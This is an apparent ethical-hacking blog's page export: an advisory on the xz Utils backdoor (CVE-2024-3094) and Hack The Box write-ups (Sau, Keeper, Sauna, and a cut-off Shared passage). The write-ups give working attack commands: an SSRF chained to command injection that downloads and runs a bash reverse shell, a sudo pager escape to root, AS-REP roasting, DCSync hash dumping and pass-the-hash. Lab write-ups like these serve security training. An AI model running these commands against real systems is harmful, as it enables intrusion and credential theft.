
[{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"CVE-2024–3094 is identified as a vulnerability affecting versions 5.6.0 and 5.6.1 of XZ Utils, a popular utility for file compression in Linux distributions. This vulnerability is categorized under CWE-506 (Embedded Malicious Code), suggesting the presence of a backdoor that could potentially be exploited by the attackers​.\nDetailed Analysis # This CVE reflects a critical security issue where a backdoor has been intentionally inserted into the software, making it a supply-chain vulnerability. This type of vulnerability is particularly concerning because it implies that the malicious code was inserted during the development or distribution phase, affecting all downstream users of the software.\nHow to Check Your Systems # To determine if you are vulnerable to CVE-2024–3094, which involves a backdoor in specific versions of XZ Utils (5.6.0 and 5.6.1), you can use command-line tools available in most Linux distributions. The method to check your version varies slightly depending on the distro, but generally, you will use the package management system associated with your distribution to query the installed version of XZ Utils.\nFor Debian/Ubuntu and derivatives # dpkg -l | grep xz-utils For Fedora, CentOS, RHEL, and derivatives # rpm -q xz For Arch Linux and derivatives # pacman -Q xz For openSUSE # zypper info xz General Command for Any Distro # If you have XZ Utils installed outside of the package manager or want to check the version directly, you can run:\nxz --version This command will print the version of XZ Utils that is currently installed on your system. If the version output matches 5.6.0 or 5.6.1, your system is vulnerable, and you should look into updating XZ Utils to a non-vulnerable version as soon as possible.\nAnalysis Summary # CVE ID: CVE-2024–3094 Vulnerability Type: Backdoor Affected Software: XZ Utils, a library used in multiple Linux distributions Impact: Potential for unauthorized access, code execution, and data compromise Attack Vector: Supply-chain, indicating the compromise of software components at the source level Impact # The presence of a backdoor in XZ Utils could allow unauthorized access to affected systems. Attackers could exploit this backdoor to bypass security mechanisms, execute arbitrary code, access sensitive information, or gain a foothold in the network for further malicious activities.\nAffected Versions:\nXZ Utils version 5.6.0 XZ Utils version 5.6.1 Given the utility’s widespread use in Linux environments for file compression and decompression, the potential impact is significant, affecting potentially a large number of systems and applications that rely on these specific versions of XZ Utils.\nMitigation Recommendations # Update: If you are vulnerable, check your distribution’s package manager or software repository for an updated version of XZ Utils that patches CVE-2024–3094. The process to update would typically involve using your distro’s package manager (apt, yum, dnf, zypper, pacman, etc.) with the update or install commands.\nMonitor Security Advisories: Keep an eye on security advisories from your Linux distribution and the XZ Utils project for updates and recommendations.\nReference # https://www.openwall.com/lists/oss-security/2024/03/29/4\nhttps://gynvael.coldwind.pl/?lang=en\u0026id=782\nhttps://tukaani.org/xz-backdoor/\n","date":"31 March 2024","externalUrl":null,"permalink":"/posts/cve-20243094/","section":"Post","summary":"CVE-2024–3094","title":"CVE-2024–3094 Mitigating and Understanding ","type":"posts"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/authors/jose/","section":"Authors","summary":"","title":"Jose","type":"authors"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/posts/","section":"Post","summary":"","title":"Post","type":"posts"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/","section":"Rift Hacking","summary":"","title":"Rift Hacking","type":"page"},{"content":"Sau is an easy Linux-based Hack the Box machine created by sau123 that involves web exploitation, Server Side Request Forgery (SSRF), Common Vulnerabilities and Exposures (CVEs), and Sudo policy exploitation. A port scan initially revealed an HTTP server vulnerable to an SSRF bug tracked as CVE-2023-27163. The vulnerability was exploited to contact an internal HTTP server running an outdated version of Mailtrail prone to shell command injection, which we used to establish a reverse shell as puma. The sudo policy for this user allowed us to exploit CVE-2023-26604 and gain execution as root.\nInitial Recon # We began by conducting a full TCP port scan using a tuned nmap command. This command quickly and reliably scans for any relevant TCP ports on the target.\n# Run a thorough port scan nmap \u0026#34;10.10.11.224\u0026#34; -vv -Pn -sT -sV -n -p- -T4 --min-rate=1000 --max-retries=3 The scan reported two open ports and two filtered ports:\nState Transport Port Protocol Product Version Open TCP 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 Filtered TCP 80 Filtered TCP 8338 Open TCP 55555 HTTP Web # We first navigated to \u0026lt;http://10.10.11.224:55555\u0026gt; which prompted a redirection to http://10.10.11.224:55555/web. On this page we noticed a footer indicating that the site was powered by request-baskets version 1.2.1.\nWe searched for CVEs affecting this installation and found an SSRF bug, CVE-2023-27163. The CVEDetails page for this bug provided a vulnerability description along with a link to additional exploitation details.\nrequest-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.\nCVE-2023-27163 # According to the brief proof-of-concept referenced on the dedicated CVEDetails page, a special HTTP POST request should be made to /api/baskets/*{:.filepath} to create a new basket and set a forwarding URL. A simple shell script was made to streamline this process.\n#!/usr/bin/env zsh [ $# -lt 1 ] \u0026amp;\u0026amp; echo \u0026#39;Usage: ./ssrf-curl \u0026lt;URL\u0026gt; [OPTS ...]\u0026#39; \u0026amp;\u0026amp; exit 1 echo \u0026#39;{\u0026#34;proxy_response\u0026#34;:true,\u0026#34;expand_path\u0026#34;:true}\u0026#39; | jq -c --arg a \u0026#34;$1\u0026#34; \u0026#39;.forward_url=$a\u0026#39; | read json basket=$(openssl rand -hex 8) curl -so /dev/null -d \u0026#34;$json\u0026#34; \u0026#34;http://10.10.11.224:55555/api/baskets/${basket}\u0026#34; curl -s \u0026#34;http://10.10.11.224:55555/${basket}\u0026#34; ${@:2} Mailtrail # We used this script to indirectly access the HTTP server on port 80, since it cannot be accessed directly. A simple HTTP GET request was sent to verify the existence of the HTTP server and collect information.\n# Test SSRF script zsh ssrf.zsh http://localhost:80 -i | more HTTP/1.1 200 OK Cache-Control: no-cache Connection: close Content-Security-Policy: default-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; img-src * blob:; script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-eval\u0026#39; https://stat.ripe.net; frame-src *; object-src \u0026#39;none\u0026#39;; block-all-mixed-content; Content-Type: text/html Date: Thu, 28 Dec 2023 08:44:05 GMT Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT Server: Maltrail/0.53 Transfer-Encoding: chunked \u0026lt;!DOCTYPE html\u0026gt; ... A software fingerprint was found in the HTTP \u0026ldquo;Server\u0026rdquo; header with the value \u0026ldquo;Maltrail/0.53\u0026rdquo;. We searched the web for vulnerabilities affecting this version and found an OS command injection flaw disclosed here.\nDescription # Maltrail \u0026lt;= v0.54 is vulnerable to unauthenticated OS command injection during the login process.**\nSummary # [\u0026hellip;] An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.\nProof of Concept # curl 'http://hostname:8338/login' --data 'username=;`id \u0026gt; /tmp/bbq`'\nIt looks like the installed version can be exploited through the username parameter on the login endpoint at http://localhost/login, which can be accessed with the SSRF script. We started a PwnCat listener and proceeded to execute a simple bash reverse shell downloaded over HTTP.\n# Start PwnCat listener lhost=\u0026#34;10.10.14.2\u0026#34; # Change to your assigned VPN IP address pwncat-cs -l $lhost 8443 # Install: `python3 -m pip install pwncat-cs` # [In another session] Serve reverse shell over HTTP lhost=\u0026#34;10.10.14.2\u0026#34; # Change to your assigned VPN IP address mkdir ./http-share \u0026amp;\u0026amp; echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/${lhost}/8443 \u0026lt;\u0026amp;1\u0026#34; \u0026gt; http-share/index.html http-server ./http-share -p 8080 -a $lhost # Install: `npm install -g http-server` # [In another session] Trigger command execution lhost=\u0026#34;10.10.14.2\u0026#34; # Change to your assigned VPN IP address zsh ssrf.zsh http://localhost:80/login -i -d \u0026#34;username=\\`curl ${lhost}:8080|bash\\`\u0026#34; Privilege Escalation # With execution as the user puma, We found a custom sudo policy that allows us to execute a particular command as any user without the password for puma.\n# Display sudo policy sudo -l Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User puma may run the following commands on sau: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service CVE-2023-26604 # The command we can run in a privileged context is /usr/bin/systemctl status trail.service. After searching the web for known vulnerabilities in systemd/systemctl, a fairly recent privilege escalation CVE tracked as CVE-2023-26604 was found.\nsystemd before 247 does not adequately block local privilege escalation for some Sudo configurations, e.g., plausible sudoers files in which the \u0026ldquo;systemctl status\u0026rdquo; command may be executed. Specifically, systemd does not set LESSSECURE to 1, and thus other programs may be launched from the less program. This presents a substantial security risk when running systemctl from Sudo, because less executes as root when the terminal size is too small to show the complete systemctl output.\nWe checked the systemd version and noticed that the vulnerable version systemd 245 was installed.\n# Check if systemd version is vulnerable /usr/bin/systemctl --version systemd 245 (245.4-4ubuntu3.22) +PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid Exploitation # To exploit CVE-2023-26604, the terminal height was lowered as described in the CVE description, and the allowed sudo command was executed. From the pager we simply entered !sh to spawn a root shell.\n# execute systemctl with lower resolution to spawn pager stty rows 1 \u0026amp;\u0026amp; sudo systemctl status trail.service !sh Root !\n","date":"31 March 2024","externalUrl":null,"permalink":"/writeups/sau/","section":"WriteUps","summary":"Resolucion de maquina Sau","title":"Sau Writeup","type":"writeups"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"31 March 2024","externalUrl":null,"permalink":"/writeups/","section":"WriteUps","summary":"","title":"WriteUps","type":"writeups"},{"content":" About Us # At Rift Hacking, we are dedicated to promoting knowledge and practice of ethical hacking. Our mission is to provide accessible and educational resources for those interested in learning how to protect systems and data in an ethical and responsible manner.\nOur Vision # We strive to create an online community where cybersecurity enthusiasts can explore, learn, and practice ethical hacking skills. We believe in an educational approach that fosters integrity, ethics, and responsibility in the digital world.\nWhat We Offer # At Rift Hacking, you will find a variety of resources, from hands-on tutorials to informative articles and ethical hacking challenges. Our goal is to empower individuals of all skill levels to contribute to online security in a positive way.\nReferences: # https://github.com/nunocoracao/blowfish https://fontawesome.com/ https://www.freepik.com/ ","date":"27 March 2024","externalUrl":null,"permalink":"/about/","section":"Rift Hacking","summary":"About Us # At Rift Hacking, we are dedicated to promoting knowledge and practice of ethical hacking.","title":"About","type":"page"},{"content":"Keeper is an Easy machine from Hack The Box challenge. Eumeration kicks off with an Nmap scan revealing SSH and HTTP services. The HTTP service runs Request Tracker 4.4.4, known for an information disclosure vulnerability via user enumeration. Default credentials for ‘root’ are found. Accessing the admin panel discloses a user’s password, ‘Welcome2023!’.\nUsing SSH with found credentials grants access to an Ubuntu system. A Keepass database and program dump are discovered, leading to the recovery of the master password ‘rødgrød med fløde’ (Danish dessert), granting access to the Keepass database. A Putty PPK file is found and converted to an RSA key, allowing SSH access as ‘root.’ This progression results in successful completion of the challenge.\nInitial Recon # We verify our connection with the machine, in case it does not respond, Check your VPN file:\n❯ ping -c 1 10.10.11.227 PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data. 64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=140 ms --- 10.10.11.227 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 140.045/140.045/140.045/0.000 ms we start our scanning with nmap:\n\u0026gt; sudo nmap -sS --open -p- --min-rate 5000 -n -Pn -v 10.10.11.227 -oG nmapScan PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Let\u0026rsquo;s perform a more in-depth scan:\nnmap -sVC -p22,80 10.10.11.227 -oN ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Ports Info # Port Service Product Version 22 ssh OpenSSH 8.9p1 80 HTTP nginx 1.18.0 For now we do not try anything through ssh since we do not have valid credentials, So let\u0026rsquo;s look at the website.\nWeb # Default Credentials In Tracker # When browsing to this page we are greeted with the following login page. We can see that its using Request tracker When looking online i could find that the default credentials for the root account is password Entering this password gave us access to the web application.\nWhen looking through the application we can find two interesting pages. The first being the recently opened tickets page. which discloses an issue one of the users is having. They are saying they have a crash dump in their home directory to help the admins debug their issues with keepass. This is very interesting information giving us a target to go after once we have access to the system.\nSecondly when checking out the users panel of the application we could see that the same user we noticed before in the ticket had a note on her profile. This note mentioned their default starters password. Using this password gave us access to the machine with ssh using the password Welcome2023!\nSSH Credentials # ssh lnorgaard@keeper.htb Privilege Escalation # The home folder contains a ZIP archive RT30000.zip. This must be the file relevant to the ticket we’ve seen before. Transfer it to the attacking machine and unzip it.\n\u0026gt; unzip RT30000.zip Archive: RT30000.zip inflating: KeePassDumpFull.dmp extracting: passcodes.kdbx We get the crash dump for KeePass and a KeePass database file.\nExtracting the KeePass master password # It may be possible to extract the master password from the dump file! I’ve attempted to use this Python script for the task: Keepass Dump MasterKey\n\u0026gt; python3 poc.py -d /opt/ctf/htb/keeper/KeePassDumpFull.dmp 2023-08-12 21:35:47,517 [.] [main] Opened /opt/ctf/htb/keeper/KeePassDumpFull.dmp Possible password: ●,dgr●d med fl●de There are some issues with special characters. A quick Google search for dgrd med flde reveals the name of the Danish dish – Rødgrød med fløde.\nI will use the kpcli utility to interact with the KeePass database file that we have looted.\n\u0026gt; kpcli KeePass CLI (kpcli) v3.8.1 is ready for operation. Type \u0026#39;help\u0026#39; for a description of available commands. Type \u0026#39;help \u0026lt;command\u0026gt;\u0026#39; for details on individual commands. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #Rødgrød med fløde Error opening file: Couldn\u0026#39;t load the file passcodes.kdbx Error(s) from File::KeePass: The database key appears invalid or else the database is corrupt. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #rødgrød med fløde kpcli:/\u0026gt; ls === Groups === passcodes/ Success! The KeePass database master password is rødgrød med fløde. Let’s find some credentials.\nSSH Private Key for root # kpcli:/\u0026gt; ls * === Groups === eMail/ General/ Homebanking/ Internet/ Network/ Recycle Bin/ Windows/ kpcli:/\u0026gt; ls */* /passcodes/eMail: /passcodes/General: /passcodes/Homebanking: /passcodes/Internet: /passcodes/Network: === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System /passcodes/Recycle Bin: === Entries === 2. Sample Entry keepass.info 3. Sample Entry #2 keepass.info/help/kb/testform. /passcodes/Windows: kpcli:/\u0026gt; cd /passcodes/Network kpcli:/passcodes/Network\u0026gt; ls === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System kpcli:/passcodes/Network\u0026gt; show -f 0 Title: keeper.htb (Ticketing Server) Uname: root Pass: \u0026lt;REDACTED\u0026gt; URL: Notes: PuTTY-User-Key-File-3: ssh-rsa Encryption: none Comment: rsa-key-20230519 Public-Lines: 6 AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D \u0026lt;REDACTED\u0026gt; It looks like we have a root SSH private key for PuTTY! Let’s convert it to the OpenSSH-acceptable format with puttygen:\nputtygen key.putty -O private-openssh -o id_rsa And use the key to SSH:\n\u0026gt; ssh root@keeper.htb -i id_rsa \u0026gt; id uid=0(root) gid=0(root) groups=0(root) ","date":"27 March 2024","externalUrl":null,"permalink":"/writeups/keeper/","section":"WriteUps","summary":"Resolucion de maquina Keeper","title":"Keeper Writeup","type":"writeups"},{"content":"Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn\u0026amp;amp;#039;t require Kerberos pre-authentication.\nThis hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-All extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket\u0026amp;amp;#039;s psexec.py in order to gain a shell on the box as NT_AUTHORITY\\SYSTEM.\nInitial Recon # \u0026gt; ping -c 1 10.10.10.175 PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data. 64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=140 ms --- 10.10.10.175 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 139.637/139.637/139.637/0.000 ms We can see from the port scan it leaks the Domain EGOTISTICAL-BANK.LOCAL. There are also three services that have a goof attack surface http 80, smb 445 and ldap 389.\nWe can also look and see that this is probably a domain controller. Having ports; 53 DNS, 88 Kerberos and 445 are common DC ports.\n\u0026gt; nmap -sS --open -p- --min-rate 5000 -n -Pn -v -oG 10.10.10.175 nmap Port Service Product Version 53 domain Simple DNS Plus 80 HTTP Microsoft IIS httpd 10.0 88 kerberos-sec Microsoft Windows Kerberos 135 msrpc Microsoft Windows RPC 139 netbios-ssn Microsoft Windows netbios-ssn 389 ldap Microsoft Windows Active Directory LDAP 445 microsoft-ds 464 kpasswd5 593 ncacn_http Microsoft Windows RPC over HTTP 1.0 636 tcpwrapped 3268 ldap Microsoft Windows Active Directory LDAP 3269 tcpwrapped 5985 http Microsoft HTTPAPI httpd 2.0 9389 mc-nmf .NET Message Framing 49667 msrpc Microsoft Windows RPC 49675 ncacn_http Microsoft Windows RPC HTTP 1.0 49676 msrpc Microsoft Windows RPC 49677 msrpc Microsoft Windows RPC 49740 msrpc Microsoft Windows RPC 49775 msrpc Microsoft Windows RPC Active Directory # Web - Port 80 # On the about page http://10.10.10.175/about.html, we can see that there is a \u0026ldquo;Meet The Team\u0026rdquo; section and find a handful of people. I recorded each of the name in the file called listUsers.txt.\n\u0026gt; cat listUsers.txt Fergus Smith Shaun Coins Hugo Bear Bowie Taylor Sophie Driver Steven Kerb Next I\u0026rsquo;ll use a tool called username-anarchy to transform the word list of names to one with common usernames schemas, Tool Here\n\u0026gt; ./username-anarchy --input-file listUsers.txt --select-format first,last,first.last,flast \u0026gt; users.txt I\u0026rsquo;ll also add Administrator to the file as well.\nSMB - Port 445 Recon # I like to use crackmapexec to enumerate SMB.\nWe can see the hostname, domain and see idf SMBv1 is enable.\n\u0026gt; crackmapexec smb 10.10.10.175 SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) We cant view any shares.\n\u0026gt; crackmapexec smb 10.10.10.175 --shares SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [-] Error enumerating shares: STATUS_USER_SESSION_DELETED Sometimes we can try doing a null session to see if we can get anything else. A null sessions is simply providing nothing for the username and password. But still nothing.\n\u0026gt; crackmapexec smb 10.10.10.175 --shares -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\: SMB 10.10.10.175 445 SAUNA [-] Error enumerating shares: STATUS_ACCESS_DENIED We can also try another tool called smbmap to see if it gives us anything different but it doesn\u0026rsquo;t.\n\u0026gt; smbmap -H 10.10.10.175 [+] IP: 10.10.10.175:445 Name: 10.10.10.175 Kerbrute # Now that I have a list of posible usernames i can use a tool called kerbrute to test and see if any of the usernames are valid.\nThe cool thing about kerburte is it won\u0026rsquo;t create event id 4625 in the logs. Event id 4625 will document every failed log-on. This will instead create a Kerberos Failure event id 4771, its not logged by default.\n\u0026gt; kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL listUser.txt 2024/02/18 09:31:07 \u0026gt; Using KDC(s): 2024/02/18 09:31:07 \u0026gt; 10.10.10.175:88 2024/02/18 09:31:07 \u0026gt; [+] VALID USERNAME:\tfsmith@EGOTISTICAL-BANK.LOCAL 2024/02/18 09:31:07 \u0026gt; Done! Tested 12 usernames (1 valid) in 0.285 seconds Kerberoast # Now that we have two valid usernames we can leverage some impacket scripts Impacket github. The one I used on this machine was GetNPUser.py which will do an AS_REP Roast/Kerberoast.\n\u0026gt; impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bfa9cf66c4efa162cd18472a39b04966$5c796f89e55dfba2c4b0eccfa2b4198679aeddbfbddc37430a2bc75a49e472e05ccc330187a59c43f603b58e124e4c864c7d02d056056c6d782b32ca6156bb7b7b530effe162bdb7d7ce8470bebf8ce61238e23648957feed32538f0ee1f417c420243316ffb917605e649d42e249a5b2726a59ee9d2816edf045407b88dade504d12f41942faf1f244f5f29dc187e1c964677f66dc2e0160b6e56693f7f8a22816836215ecf22188e5024fb37f57e8e74b274d8eaa5b1296055ed33471620245ec1c7fb0653d0cd053156c314e181d0719c9f75c1032e3a4215c310378a1f3002ab5936223251ac1ea2190bf6fd74eb2c18e18067f186f1415533fddd6dea50 Now that we have a hash we can use hashcat to crack it, I did this on my host machine to utileze a GPU. we get a hit and now have a creds fsmith:Thestrokes23\n\u0026gt; .\\hascat.exe -m 18200 ..\\hash ..\\rockyou.txt --force fsmith:Thestrokes23 SMB PT2 # Now that we have some valid credentials fsmith:Thestrokes23 we can try and authenticate to SMB again using crackmapexec and we can see that we have valid creds!\n\u0026gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 Next I will enumerate shares and one sticks out RICOH Aficio SP 8300DN PCL 6\n\u0026gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 SMB 10.10.10.175 445 SAUNA [+] Enumerated shares SMB 10.10.10.175 445 SAUNA Share Permissions Remark SMB 10.10.10.175 445 SAUNA ----- ----------- ------ SMB 10.10.10.175 445 SAUNA ADMIN$ Remote Admin SMB 10.10.10.175 445 SAUNA C$ Default share SMB 10.10.10.175 445 SAUNA IPC$ READ Remote IPC SMB 10.10.10.175 445 SAUNA NETLOGON READ Logon server share SMB 10.10.10.175 445 SAUNA print$ READ Printer Drivers SMB 10.10.10.175 445 SAUNA RICOH Aficio SP 8300DN PCL 6 We cant print money SMB 10.10.10.175 445 SAUNA SYSVOL READ Logon server share Taking a look at searchsploit there are a handful of exploits for this but we need a shell first. We can see that we can authenticate with winrm.\n\u0026gt; crackmapexec winrm 10.10.10.175 -u \u0026#39;fsmith\u0026#39; -p \u0026#39;Thestrokes23\u0026#39; SMB 10.10.10.175 5985 SAUNA [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) HTTP 10.10.10.175 5985 SAUNA [*] http://10.10.10.175:5985/wsman WINRM 10.10.10.175 5985 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 (Pwn3d!) I\u0026rsquo;ll use evil-winrm to get shell.\n\u0026gt; evil-winrm -u fsmith -i 10.10.10.175 -p Thestrokes23 Taking a look at the Desktop we can grab our user flag.\nPrivilege Escalation # Lateral movement # I uploaded a great tool called winPEAS that is great for some automation when trying to escalate. I uploaded it using Evil-Winrm.\n*Evil-WinRM* PS C:\\Temp\u0026gt; upload winPEASx64.exe Info: Uploading /home/mhil4ne/Downloads/winPEASx64.exe to C:\\Temp\\winPEASx64.exe\rData: 3183272 bytes of 3183272 bytes copied\rInfo: Upload successful We get a lot of output from this but one section sticks outs particularly, the AutoLogon A service account has an auto logon enabled and we can harvest svc_loanmgr:Moneymakestheworldgoround! as valid credentials.\nWe can try those credentials with Evil-Winrm and we get in\n\u0026gt; evil-winrm -u svc_loanmgr -i 10.10.10.175 -p Moneymakestheworldgoround!\r*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents\u0026gt; Get Administrator # With these credentials, we can run a tool called Bloodhound. It is a tool that finds hidden relationships within Active Directory. It can often lead to some quick privilege escalation. There is a python and impacket version of it that I\u0026rsquo;ll be using for Sauna.\nInstalling is very easy.\nsudo pip install bloodhound Then we can run the command:\n\u0026gt; bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All To start the attack. it created a lot .json files that that we will import into bloodhound.\n\u0026gt; ls 20240218112738_computers.json 20240218112738_domains.json 20240218112738_groups.json 20240218112738_users.json 20240218112738_containers.json 20240218112738_gpos.json 20240218112738_ous.json To start the bloodhound console i ran neo4j console then bloodhound in the console. Next, we will upload our files by clicking the upload button on the right.\nAfter importing our files we can select \u0026ldquo;Find Principals with DCSync Rights\u0026rdquo; and it generates a graph. Our service account has two permissions. Notice its similar permissions of administrators.\nGetChanges GetChangesAll I right-clicked the relation and selected “Help”. Under the Abuse info,m I learned that we can perform a dcsync attack to get password hashes.\nImpacket has a tool called secretsdump.py we can use to leverage this.\npython3 secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator Impacket v0.11.0 - Copyright 2023 Fortra Password: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657 Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e Administrator:des-cbc-md5:fb8f321c64cea87f Now we have the admins Hash. We can use it in a pass the hash attack.\n\u0026gt; evil-winrm -u Administrator -i 10.10.10.175 -H 823452073d75b9d1cf70ebdf86c7f98e we are administrator.\n","date":"27 March 2024","externalUrl":null,"permalink":"/writeups/sauna/","section":"WriteUps","summary":"Resolucion de maquina Keeper","title":"Sauna Writeup","type":"writeups"},{"content":"Shared is a medium Linux machine created by Nauten on Hack The Box that features a website with a virtual hostname that is vulnerable to SQL injection. Successful exploitation of this vulnerability provides us with the password for a user called james_mason. With these credentials we are able to login via SSH and elevate privileges to a user called dan_smith by exploiting a cron job that uses a version of ipython that is vulnerable to CVE-2022-21699. We then reverse-engineer an executable using both static and dynamic analysis to recover the password for the local Redis service. The Redis process is running as root, so we load a special shared object module using LOAD MODULE to execute commands as root.\nInitial Recon # Let\u0026rsquo;s first set up our environment and run a TCP port scan with this custom nmap wrapper.\n# Mhil4ne@Kali export rhost=\u0026#34;10.10.10.x\u0026#34; sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv $rhost -oG nmap {:.nolineno}\nThe scan reports that the SSH service, HTTP service, and HTTPS service are running on ports 22, 80, and 443 respectively.\nWeb Recon # Upon visiting port 80, we are redirected to shared.htb. Let\u0026rsquo;s add this hostname to our /etc/hosts{:.filepath} file with the corresponding IP address.\nNow we\u0026rsquo;ll visit https://shared.htb/ in a browser session being proxied through the BurpSuite HTTP proxy.\nshared.htb web index page\nWalking the Application # When exploring the content of the website, we eventually discover the checkout page at /index.php?controller=cart\u0026amp;action=show. When we hover over the checkout button, we can see that it will send us to https://checkout.shared.htb. Let\u0026rsquo;s add this virtual hostname to our /etc/hosts{:.filepath} file so we can view its content.\nsudo sed -E -i \u0026#39;s/(shared.htb).*/\\1 checkout.\\1/\u0026#39; /etc/hosts {:.nolineno}\nNow when we add an item to our cart and navigate to /index.php?controller=cart\u0026amp;action=show, we\u0026rsquo;ll click the checkout button to be redirected to the checkout site.\ncheckout.shared.htb web index page\nInvestigating Functionality # It\u0026rsquo;s interesting how this site is able to determine which item we had in our cart considering we did not supply any HTTP GET or POST parameters. Let\u0026rsquo;s investigate.\nLooking at the initial request we sent to the checkout site in the BurpSuite site map, we can see that our request contains an unusual cookie called custom_cart. The value of this cookie can be automatically decoded by highlighting it, revealing a JSON object with the product code and quantity of the checkout item.\nWe find a mysterious cookie in BurpSuite\nWe can infer that the site uses the supplied product code in custom_cart to find the price of the item since we do not supply the price, but only the product code. This activity is likely handled by some type of database solution such as an SQL server. With this in mind, we can check if this functionality is vulnerable to SQL injection.\nVulnerability Discovery # Let\u0026rsquo;s input some basic SQL injection payloads to the cookie in the BurpSuite repeater tab to see if SQL injection is possible.\nThe server\u0026rsquo;s response to a common SQL injection 